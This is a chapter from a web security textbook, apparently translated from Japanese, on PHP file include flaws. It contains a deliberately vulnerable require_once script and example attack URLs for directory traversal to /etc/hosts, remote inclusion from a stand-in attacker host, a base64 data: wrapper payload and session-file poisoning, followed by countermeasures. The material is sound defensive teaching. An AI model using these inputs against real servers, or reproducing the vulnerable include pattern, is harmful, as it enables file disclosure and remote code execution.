# Chapter 4.13: File Include Attacks

This section covers vulnerabilities related to file include functionality in scripting languages like PHP, where external input can influence which files are included, leading to information leakage and arbitrary code execution.

---

## 4.13.1 File Include Vulnerabilities

### Overview

- PHP and other scripting languages have functionality to include parts of another script's source from a separate file
- In PHP: `require`, `require_once`, `include`, `include_once`
- When the file name passed to `include` etc. can be specified externally, and the application does not validate it, a **file include vulnerability** arises
- In PHP, depending on configuration, it is possible to specify an external server URL as the file name -- this is called **Remote File Inclusion (RFI)**

### Impact of File Include Attacks

- **Web server file disclosure** (information leakage)
- **Execution of arbitrary scripts** -- typical consequences include:
  - Server tampering
  - Unauthorized function execution
  - Attacks on other sites (stepping stone)

### Countermeasures Overview

- Do not include external parameters in the path to include
- If the include path contains external parameters, restrict them to alphanumeric characters

---

## File Include Vulnerability Summary

| Item | Details |
|------|---------|
| **Occurs in** | Pages that use `include` or similar to load scripts |
| **Affected pages** | All pages can be affected |
| **Impact severity** | Information leakage, server tampering, unauthorized execution, attacks on other sites |
| **Impact level** | High |
| **User involvement** | Not required |
| **Countermeasure** | Do not include external parameters in file names; restrict to alphanumeric if necessary |

---

## Attack Methods and Impact

### Vulnerable Sample Application

A PHP script (`4d-001.php`) takes a `header` parameter from `$_GET` and includes it:

```php
<body>
<?php
  $header = $_GET['header'];
  require_once($header . '.php');
?>
本文【省略】
</body>
```

- The script appends `.php` to the header parameter and uses `require_once` to include it
- A file like `spring.php` (for a campaign page) is included based on the parameter

**Normal request:**
```
http://example.jp/4d/4d-001.php?header=spring
```

---

### Information Leakage via Directory Traversal

- Using directory traversal techniques (appending `../` sequences) and null byte attacks (`%00`), an attacker can read arbitrary files on the server:

```
http://example.jp/4d/4d-001.php?header=../../../../../../etc/hosts%00
```

- This causes the contents of `/etc/hosts` to be displayed, demonstrating that file include attacks can expose sensitive server files
- The web server's public files and internal files become accessible

---

### Script Execution 1: Remote File Inclusion (RFI)

- PHP's `include`/`require` can specify a URL to include a file from an external server (Remote File Inclusion)
- **Important**: RFI is extremely dangerous. Since PHP 5.2.0, it is disabled by default

**External attack script** (`4d-900.txt`):
```php
<?php phpinfo(); ?>
```

- The attacker hosts this file on their server, then crafts a URL:

```
http://example.jp/4d/4d-001.php?header=http://trap.example.com/4d/4d-900.txt?
```

- The `?` at the end causes the `.php` extension appended by `require_once` to be treated as a query string, so the file `4d-900.txt` is downloaded and executed
- Result: `phpinfo()` output is displayed, confirming arbitrary code execution

#### RFI Attack Variations

- Even if RFI is disabled, attackers can use `data:` stream wrappers and PHP stream wrappers to achieve similar results:

```
http://example.jp/4d/4d-001.php?header=data:text/plain;base64,PD9w
aHAgcGhwaW5mbygpOyA/Pg==
```

- The `data:` stream wrapper with base64-encoded content bypasses the need for an external server
- To use these, `allow_url_include` must be On (disabled by default since PHP 5.2.0)

**References:**
- PHP Stream Wrappers: http://php.net/manual/ja/wrappers.php
- data: Stream Wrapper: http://php.net/manual/ja/wrappers.data.php

---

### Script Execution 2: Session File Exploitation

- Even if RFI is disabled, if session storage uses files, attackers can exploit local file include to execute scripts

**Attack scenario using session files:**

1. An input form (`4d-002.html`) sends data to a PHP script (`4d-003.php`)
2. The script stores user input in a session variable and saves the session to a file:

```php
<?php
  session_start();
  $_SESSION['answer'] = $_POST['answer'];
  $session_filename = session_save_path() . '/sess_' . session_id();
?>
```

3. The session file stores data in the format: `answer|s:21:"<?php phpinfo(); ?>"`
4. The attacker injects PHP code (e.g., `<?php phpinfo(); ?>`) into the form field
5. This code is stored in the session file on the server
6. The attacker then uses file include to load the session file, causing the injected PHP code to execute

**Tricks used:**
- The `.php` extension is avoided by using null byte (`%00`) or other techniques
- Session file path is predictable: `/var/lib/php5/sess_<session_id>`

---

### File Upload + File Include

- If the application allows file uploads, an attacker can upload a file containing PHP code and then include it via the file include vulnerability

---

## Root Causes

File include vulnerabilities occur when two conditions are met:

1. **Include file name can be specified from external input**
2. **No validation check on whether the file name is appropriate**

---

## Countermeasures

The approach is the same as for directory traversal vulnerabilities:

- **Avoid designs that allow external specification of file names**
- **Restrict file names to alphanumeric characters**

As a defense-in-depth measure:

- Set RFI configuration to disabled
- Verify that `allow_url_include` is Off in `phpinfo()` output

```
allow_url_include = Off
```

---

## Key Takeaways

- File include vulnerabilities are especially dangerous in PHP, where `include`/`require` can dynamically load files
- Even with RFI disabled, local file include through session files or uploaded files remains a serious threat
- The impact is severe: arbitrary code execution, information leakage, and server compromise
- Always validate and restrict file name parameters; never allow raw external input to control include paths
- Check that files included are appropriate, and restrict to alphanumeric characters when external input is involved
